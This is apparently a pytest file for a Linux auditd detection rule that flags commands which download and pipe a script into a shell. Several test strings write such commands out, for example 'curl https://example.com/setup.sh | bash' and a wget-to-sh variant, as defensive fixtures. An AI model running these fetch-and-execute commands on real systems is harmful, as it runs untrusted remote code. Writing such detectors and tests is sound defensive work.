"""Tests for suspicious audit command detection."""

from datetime import UTC, datetime
from hashlib import sha256

from linuxtrace.detection.audit_commands import (
    detect_suspicious_audit_commands,
)
from linuxtrace.models.normalized_event import NormalizedEvent
from linuxtrace.models.raw_event import RawEvent


def make_event(
    command,
    *,
    event_type="audit_syscall",
    source="auditd",
    outcome="success",
):
    raw = f"audit-test-{command}-{event_type}-{source}-{outcome}"

    return NormalizedEvent(
        event_id=sha256(raw.encode()).hexdigest(),
        raw_event=RawEvent(
            source=source,
            source_file="/var/log/audit/audit.log",
            source_line=1,
            raw_log=raw,
            evidence_hash=sha256(raw.encode()).hexdigest(),
        ),
        timestamp=datetime(2026, 11, 28, 10, 0, tzinfo=UTC),
        event_category="process",
        event_type=event_type,
        severity="info",
        command=command,
        outcome=outcome,
        description=raw,
    )


def test_detects_curl_pipe_bash():
    event = make_event("bash -c 'curl https://example.com/setup.sh | bash'")

    findings = detect_suspicious_audit_commands([event])

    assert len(findings) == 1
    assert findings[0].rule_id == "LT-AUDIT-001"
    assert findings[0].severity.value == "high"
    assert findings[0].related_event_ids == [event.event_id]


def test_detects_wget_pipe_sh():
    event = make_event("sh -c 'wget -qO- https://example.com/run.sh | sh'")

    assert len(detect_suspicious_audit_commands([event])) == 1


def test_ignores_normal_command():
    event = make_event("bash -c 'echo hello'")

    assert detect_suspicious_audit_commands([event]) == []


def test_ignores_failed_syscall():
    event = make_event(
        "bash -c 'curl https://example.com/x | bash'",
        outcome="failure",
    )

    assert detect_suspicious_audit_commands([event]) == []


def test_ignores_non_audit_source():
    event = make_event(
        "bash -c 'curl https://example.com/x | bash'",
        source="syslog",
    )

    assert detect_suspicious_audit_commands([event]) == []


def test_ignores_other_event_type():
    event = make_event(
        "bash -c 'curl https://example.com/x | bash'",
        event_type="audit_user_login",
    )

    assert detect_suspicious_audit_commands([event]) == []


def test_duplicate_event_produces_one_finding():
    event = make_event("bash -c 'curl https://example.com/x | bash'")

    assert len(detect_suspicious_audit_commands([event, event])) == 1


def test_deterministic_finding_id():
    event = make_event("bash -c 'curl https://example.com/x | bash'")

    first = detect_suspicious_audit_commands([event])
    second = detect_suspicious_audit_commands([event])

    assert first == second


def test_malformed_command_does_not_crash():
    event = make_event("bash -c 'unfinished")

    assert detect_suspicious_audit_commands([event]) == []


def test_quoted_pipeline_is_not_execution():
    event = make_event("bash -c 'echo \"curl https://example.com/x | bash\"'")

    assert detect_suspicious_audit_commands([event]) == []


def test_echo_to_shell_is_not_download():
    event = make_event("bash -c 'echo hello | bash'")

    assert detect_suspicious_audit_commands([event]) == []


def test_double_pipe_is_not_pipeline():
    event = make_event("bash -c 'curl https://example.com/x || bash'")

    assert detect_suspicious_audit_commands([event]) == []


def test_http_download_pipeline_detected():
    event = make_event("bash -c 'curl https://example.com/x | /bin/bash'")

    assert len(detect_suspicious_audit_commands([event])) == 1
